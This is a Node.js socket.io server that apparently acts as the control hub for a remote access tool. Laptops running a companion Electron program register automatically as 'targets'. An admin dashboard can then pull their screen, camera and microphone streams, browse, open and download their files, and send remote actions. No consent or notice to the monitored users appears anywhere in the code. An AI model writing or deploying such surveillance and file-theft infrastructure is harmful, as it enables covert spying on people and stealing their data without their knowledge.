const express = require('express');
const app = express();
const http = require('http');
const path = require('path');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server, { cors: { origin: "*" } });

// Serve Admin Dashboard from public folder
app.use(express.static(path.join(__dirname, 'public')));

let clients = {}; // Keep track of all connected target laptops

io.on('connection', (socket) => {
  
  // A target laptop (Electron EXE) connects automatically and registers itself
  socket.on('register-client', (data) => {
    let hostname = typeof data === 'string' ? data : data.name;
    let type = data.type || 'screen';
    console.log('Target Laptop Connected:', hostname, socket.id, 'Type:', type);
    clients[socket.id] = { id: socket.id, name: hostname, type: type };
    // Tell the admin dashboard to update the UI
    io.emit('client-list', clients);
  });

  socket.on('client-error', (err) => {
    console.error(`Error from client ${socket.id}:`, err);
  });

  // Admin dashboard requests the current list of online laptops
  socket.on('get-clients', () => {
    socket.emit('client-list', clients);
  });

  // Admin explicitly requests Screen
  socket.on('request-screen', (targetClientId) => {
    io.to(targetClientId).emit('request-screen', socket.id);
  });

  // Admin explicitly requests Camera
  socket.on('request-camera', (targetClientId) => {
    io.to(targetClientId).emit('request-camera', socket.id);
  });

  // Admin explicitly requests Mic only
  socket.on('request-mic', (targetClientId) => {
    io.to(targetClientId).emit('request-mic', socket.id);
  });

  // Admin explicit stops
  socket.on('stop-screen', (targetClientId) => {
    io.to(targetClientId).emit('stop-screen');
  });

  socket.on('stop-camera', (targetClientId) => {
    io.to(targetClientId).emit('stop-camera');
  });

  socket.on('stop-mic', (targetClientId) => {
    io.to(targetClientId).emit('stop-mic');
  });

  // Admin clicks to stop watching entirely (fallback)
  socket.on('stop-watch', (targetClientId) => {
    io.to(targetClientId).emit('stop-watch');
  });

  // Relay screen frames from client to admin
  socket.on('screen-frame', (data) => {
    io.to(data.targetId).emit('screen-frame', { frame: data.frame, from: socket.id });
  });

  // WebRTC Signaling relays for Camera/Mic clients
  socket.on('offer', (data) => {
    io.to(data.targetId).emit('offer', { offer: data.offer, from: socket.id });
  });

  socket.on('answer', (data) => {
    io.to(data.targetId).emit('answer', { answer: data.answer, from: socket.id });
  });

  socket.on('ice-candidate', (data) => {
    io.to(data.targetId).emit('ice-candidate', { candidate: data.candidate, from: socket.id });
  });

  // File Browser Relays
  socket.on('request-files', (data) => {
    io.to(data.targetId).emit('request-files', { from: socket.id, path: data.path });
  });

  socket.on('file-list', (data) => {
    io.to(data.targetId).emit('file-list', data);
  });

  socket.on('open-file', (data) => {
    io.to(data.targetId).emit('open-file', data.path);
  });

  socket.on('download-file', (data) => {
    io.to(data.targetId).emit('download-file', { path: data.path, adminId: socket.id });
  });

  socket.on('download-result', (data) => {
    io.to(data.adminId).emit('download-result', data.fileData);
  });

  socket.on('remote-action', (data) => {
    io.to(data.targetId).emit('remote-action', data.action);
  });

  socket.on('force-stop-all', (targetId) => {
    io.to(targetId).emit('force-stop-all');
  });

  socket.on('disconnect', () => {
    if (clients[socket.id]) {
      console.log('Target Laptop Disconnected:', clients[socket.id].name);
      delete clients[socket.id];
      io.emit('client-list', clients);
    } else {
      // It was an admin who disconnected. Stop all streams on all targets for safety.
      console.log('Admin Disconnected. Force stopping all active streams.');
      io.emit('force-stop-all');
    }
  });
});

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`\n=============================================`);
  console.log(`✅ Admin Server Running!`);
  console.log(`🌍 Open Chrome on your laptop and go to:`);
  console.log(`   http://localhost:${PORT}`);
  console.log(`=============================================\n`);
});
